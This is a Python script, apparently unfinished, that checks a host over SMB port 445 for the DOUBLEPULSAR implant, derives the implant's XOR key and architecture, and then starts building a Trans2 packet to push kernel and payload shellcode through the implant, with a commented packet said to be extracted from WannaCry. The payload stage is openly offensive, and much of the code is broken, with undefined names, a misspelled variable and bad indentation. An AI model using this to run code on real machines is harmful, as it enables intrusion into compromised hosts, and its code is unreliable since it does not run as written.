#!/usr/bin/python

import binascii
import socket
import struct
import threading

#https://github.com/SecureAuthCorp/impacket/blob/master/impacket/smb.py
class NewSMBPacket(Structure):
    structure = (
        ('Signature', '"\xffSMB'),
        ('Command','B=0'),
        ('ErrorClass','B=0'),
        ('_reserved','B=0'),
        ('ErrorCode','<H=0'),
        ('Flags1','B=0'),
        ('Flags2','<H=0'),
        ('PIDHigh','<H=0'),
        ('SecurityFeatures','8s=""'),
        ('Reserved','<H=0'),
        ('Tid','<H=0xffff'),
        ('Pid','<H=0'),
        ('Uid','<H=0'),
        ('Mid','<H=0'),
        ('Data','*:'),
    )
	
class SMBTransaction2Secondary_Parameters_Fixed(smb.SMBCommand_Parameters):
    structure = (
        ('TotalParameterCount','<H=0'),
        ('TotalDataCount','<H'),
        ('ParameterCount','<H=0'),
        ('ParameterOffset','<H=0'),
        ('ParameterDisplacement','<H=0'),
        ('DataCount','<H'),
        ('DataOffset','<H'),
        ('DataDisplacement','<H=0'),
    )

class SMBCommand(Structure):
    structure = (
        ('WordCount', 'B=len(Parameters)//2'),
        ('_ParametersLength','_-Parameters','WordCount*2'),
        ('Parameters',':'),             # default set by constructor
        ('ByteCount','<H-Data'),
        ('Data',':'),                   # default set by constructor
    )

class SMBTransaction2Secondary_Data(Structure):
    structure = (
        ('Pad1Length','_-Pad1','self["Pad1Length"]'),
        ('Pad1',':'),
        ('Trans_ParametersLength','_-Trans_Parameters','self["Trans_ParametersLength"]'),
        ('Trans_Parameters',':'),
        ('Pad2Length','_-Pad2','self["Pad2Length"]'),
        ('Pad2',':'),
        ('Trans_DataLength','_-Trans_Data','self["Trans_DataLength"]'),
        ('Trans_Data',':'),
    )
    
#https://github.com/SecureAuthCorp/impacket/blob/master/impacket/smb.py
def addCommand(self, command):
  if len(self['Data']) == 0:
    self['Command'] = command.command
    
  else:
    self['Data'][-1]['Parameters']['AndXCommand'] = command.command
    self['Data'][-1]['Parameters']['AndXOffset'] = len(self)
    self['Data'].append(command)

def calculate_doublepulsar_xor_key(s):
    x = (2 * s ^ (((s & 0xff00 | (s << 16)) << 8) | (((s >> 16) | s & 0xff0000) >> 8)))
    x = x & 0xffffffff  # this line was added just to truncate to 32 bits
    return x


# The arch is adjacent to the XOR key in the SMB signature
def calculate_doublepulsar_arch(s):
    if s & 0xffffffff00000000 == 0:
        return "x86 (32-bit)"
    else:
        return "x64 (64-bit)"

#https://github.com/SecureAuthCorp/impacket/blob/master/impacket/smb.py
def logoff(self):
        smb = NewSMBPacket()

        logOff = SMBCommand(SMB.SMB_COM_LOGOFF_ANDX)
        logOff['Parameters'] = SMBLogOffAndX()
        smb.addCommand(logOff)

        self.sendSMB(smb)
        self.recvSMB()
        # Let's clear some fields so you can login again under the same session
        self._uid = 0

#https://github.com/SecureAuthCorp/impacket/blob/master/impacket/smb.py
def disconnect_tree(self, tid):
        smb = NewSMBPacket()
        smb['Tid']  = tid

        smb.addCommand(SMBCommand(SMB.SMB_COM_TREE_DISCONNECT))

        self.sendSMB(smb)
        self.recvSMB()

if __name__ == "__main__":
    # Packets
    negotiate_protocol_request = binascii.unhexlify("00000085ff534d4272000000001853c00000000000000000000000000000fffe00004000006200025043204e4554574f524b2050524f4752414d20312e3000024c414e4d414e312e30000257696e646f777320666f7220576f726b67726f75707320332e316100024c4d312e325830303200024c414e4d414e322e3100024e54204c4d20302e313200")
    session_setup_request = binascii.unhexlify("00000088ff534d4273000000001807c00000000000000000000000000000fffe000040000dff00880004110a000000000000000100000000000000d40000004b000000000000570069006e0064006f007700730020003200300030003000200032003100390035000000570069006e0064006f007700730020003200300030003000200035002e0030000000")
    tree_connect_request = binascii.unhexlify("00000060ff534d4275000000001807c00000000000000000000000000000fffe0008400004ff006000080001003500005c005c003100390032002e003100360038002e003100370035002e003100320038005c00490050004300240000003f3f3f3f3f00")
    trans2_session_setup = binascii.unhexlify("0000004eff534d4232000000001807c00000000000000000000000000008fffe000841000f0c0000000100000000000000a6d9a40000000c00420000004e0001000e000d0000000000000000000000000000")

    timeout = 5.0
    # sample IP
    ip = "192.168.0.8"

    # Connect to socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(float(timeout) if timeout else None)
    host = ip
    port = 445
    s.connect((host, port))

    # Send/receive negotiate protocol request
    print("Sending negotiation protocol request")
    s.send(negotiate_protocol_request)
    s.recv(1024)

    # Send/receive session setup request
    print("Sending session setup request")
    s.send(session_setup_request)
    session_setup_response = s.recv(1024)

    # Extract user ID from session setup response
    user_id = session_setup_response[32:34]
    print("User ID = %s" % struct.unpack("<H", user_id)[0])

    # Replace user ID in tree connect request packet
    modified_tree_connect_request = bytearray(tree_connect_request)
    modified_tree_connect_request[32] = user_id[0]
    modified_tree_connect_request[33] = user_id[1]

    # Send tree connect request
    print("Sending tree connect")
    s.send(modified_tree_connect_request)
    tree_connect_response = s.recv(1024)

    # Extract tree ID from response
    tree_id = tree_connect_response[28:30]
    print("Tree ID = %s" % struct.unpack("<H", tree_id)[0])

    # Replace tree ID and user ID in trans2 session setup packet
    modified_trans2_session_setup = bytearray(trans2_session_setup)
    modified_trans2_session_setup[28] = tree_id[0]
    modified_trans2_session_setup[29] = tree_id[1]
    modified_trans2_session_setup[32] = user_id[0]
    modified_trans2_session_setup[33] = user_id[1]

    # Send trans2 sessions setup request
    print("Sending trans2 session setup - ping command")
    s.send(modified_trans2_session_setup)
    final_response = s.recv(1024)

    # Check for 0x51 response to indicate DOUBLEPULSAR infection
    if final_response[34] == 81:
        signature = final_response[18:26]
        signature_long = struct.unpack('<Q', signature)[0]
        key = calculate_doublepulsar_xor_key(signature_long)
        arch = calculate_doublepulsar_arch(signature_long)
        print("[+] [%s] DOUBLEPULSAR SMB IMPLANT DETECTED!!! Arch: %s, XOR Key: %s" % (ip, arch, hex(key)))

        #will use a structure than hex code of the Trans2 EXEC packet
        #packet in to execute a payload - extracted from wannacry
        #trans2_exec_packet = binascii.unhexlify("0000104eff534d4232000000001807c00000000000000000000000000008fffe000842000f0c000010010000000000000025891a0000000c00420000104e0001000e000d1000")
        
        # Replace tree ID and user ID in trans2 exec packet
        #modified_trans2_exec_packet = bytearray(trans2_exec_packet)
        #modified_trans2_exec_packet[28] = tree_id[0]
        #modified_trans2_exec_packet[29] = tree_id[1]
        #modified_trans2_exec_packet[32] = user_id[0]
        #modified_trans2_exec_packet[33] = user_id[1]

        #read file into memory here
        
        
        #merge file with kernel shellcode to run payload
        #kernel shellcode is for 64 bits at the moment
        modified_kernel_shellcode = bytearray(kernel_shellcode)
        
        #add PAYLOAD shellcode length after the kernel shellcode and write this value in hex 
        modified_kernel_shellcode += payload_shellcode_size
        #add the shellcode after the shellcode size
        modified_kernel_shellcode += payload_shellcode

        #XOR memory buffer
        xor_encrypt(modified_kernel_shellcode)
        
        #fill up the packet structures
        #CODE IS NOT FINISHED HERE
        #helpful resource: https://www.rapid7.com/blog/post/2019/10/02/open-source-command-and-control-of-the-doublepulsar-implant/

        doublepulsar_pkt = smb.NewSMBPacket()
        
        #some values here
        doublepulsar_pkt.Flags1 = 0x18
        doublepulsar_pkt.Flags2 = 0xc007
        doublepulsar_pkt.Timeout = 0x25891a00
        
        #more will be filled if needed
        #unsure if more need to be populated at this time

        #build packet from scratch; no parameters
        transCommand = smb.SMBCommand(smb.SMB.SMB_COM_TRANSACTION2_SECONDARY)
        transCommand['Parameters'] = SMBTransaction2Secondary_Parameters_Fixed()
        transCommand['Data'] = smb.SMBTransaction2Secondary_Data()

        transCommand['Parameters']['TotalParameterCount'] = 15
        transCommand['Parameters']['TotalDataCount'] = len(data)

        fixedOffset = 32+3+18
        transCommand['Data']['Pad1'] = ''
        

        transCommand['Parameters']['ParameterCount'] = 12
        transCommand['Parameters']['ParameterOffset'] = 0
        transCommand['Parameters']['DataCount'] = len(data)
        transCommand['Parameters']['DataOffset'] = fixedOffset + pad2Len
        transCommand['Parameters']['DataDisplacement'] = displacement

        transCommand['Data']['Trans_Parameters'] = '' #parameters
        transCommand['Data']['Trans_Data'] = data
        doublpulsar_pkt.addCommand(transCommand)

        #conn.sendSMB(doublepulsar_pkt)
        s.send(doublepulsar_pkt)
        
        #send disconnect
        conn.disconnect_tree(tid)

        #send logoff
	conn.logoff()

	#close connection
	s.close()
